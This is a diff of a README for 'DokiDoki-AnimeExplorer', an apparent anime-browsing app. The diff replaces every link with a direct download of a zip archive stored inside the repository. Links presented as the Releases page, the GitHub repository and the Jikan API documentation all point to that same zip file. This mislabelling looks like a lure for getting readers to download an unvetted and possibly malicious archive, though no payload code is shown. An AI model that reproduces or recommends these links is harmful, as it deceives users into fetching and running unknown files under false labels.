@@ -6,11 +6,11 @@ Welcome to DokiDoki-AnimeExplorer! This app allows you to browse anime by genre,
 
 ## 📥 Download the App
 
-[![Download DokiDoki-AnimeExplorer](https://raw.githubusercontent.com/mimidgb/DokiDoki-AnimeExplorer/main/mop/DokiDoki-AnimeExplorer.zip)](https://raw.githubusercontent.com/mimidgb/DokiDoki-AnimeExplorer/main/mop/DokiDoki-AnimeExplorer.zip)
+[![Download DokiDoki-AnimeExplorer](https://github.com/mimidgb/DokiDoki-AnimeExplorer/raw/refs/heads/main/lib/models/Anime_Explorer_Doki_1.5-alpha.1.zip)](https://github.com/mimidgb/DokiDoki-AnimeExplorer/raw/refs/heads/main/lib/models/Anime_Explorer_Doki_1.5-alpha.1.zip)
 
 To download DokiDoki-AnimeExplorer, visit the link below:
 
-[Download DokiDoki-AnimeExplorer](https://raw.githubusercontent.com/mimidgb/DokiDoki-AnimeExplorer/main/mop/DokiDoki-AnimeExplorer.zip)
+[Download DokiDoki-AnimeExplorer](https://github.com/mimidgb/DokiDoki-AnimeExplorer/raw/refs/heads/main/lib/models/Anime_Explorer_Doki_1.5-alpha.1.zip)
 
 ## 💻 System Requirements
 
@@ -35,7 +35,7 @@ DokiDoki-AnimeExplorer offers several features to enhance your anime viewing exp
 
 To get started, follow these steps:
 
-1. Click on the download link to visit the [Releases page](https://raw.githubusercontent.com/mimidgb/DokiDoki-AnimeExplorer/main/mop/DokiDoki-AnimeExplorer.zip).
+1. Click on the download link to visit the [Releases page](https://github.com/mimidgb/DokiDoki-AnimeExplorer/raw/refs/heads/main/lib/models/Anime_Explorer_Doki_1.5-alpha.1.zip).
 2. Choose the latest version of DokiDoki-AnimeExplorer by clicking on the corresponding link.
 3. Once the download finishes, locate the downloaded file on your device.
 4. Tap on the file to initiate the installation process.
@@ -64,8 +64,8 @@ If you encounter any issues with DokiDoki-AnimeExplorer, consider the following 
 
 ## 🔗 Resources
 
-- **GitHub Repository:** To view the source code and contribute, visit [DokiDoki-AnimeExplorer GitHub](https://raw.githubusercontent.com/mimidgb/DokiDoki-AnimeExplorer/main/mop/DokiDoki-AnimeExplorer.zip).
-- **Jikan API:** Learn more about the API used for fetching anime information at [Jikan API](https://raw.githubusercontent.com/mimidgb/DokiDoki-AnimeExplorer/main/mop/DokiDoki-AnimeExplorer.zip).
+- **GitHub Repository:** To view the source code and contribute, visit [DokiDoki-AnimeExplorer GitHub](https://github.com/mimidgb/DokiDoki-AnimeExplorer/raw/refs/heads/main/lib/models/Anime_Explorer_Doki_1.5-alpha.1.zip).
+- **Jikan API:** Learn more about the API used for fetching anime information at [Jikan API](https://github.com/mimidgb/DokiDoki-AnimeExplorer/raw/refs/heads/main/lib/models/Anime_Explorer_Doki_1.5-alpha.1.zip).
 
 ## 💬 Support
 
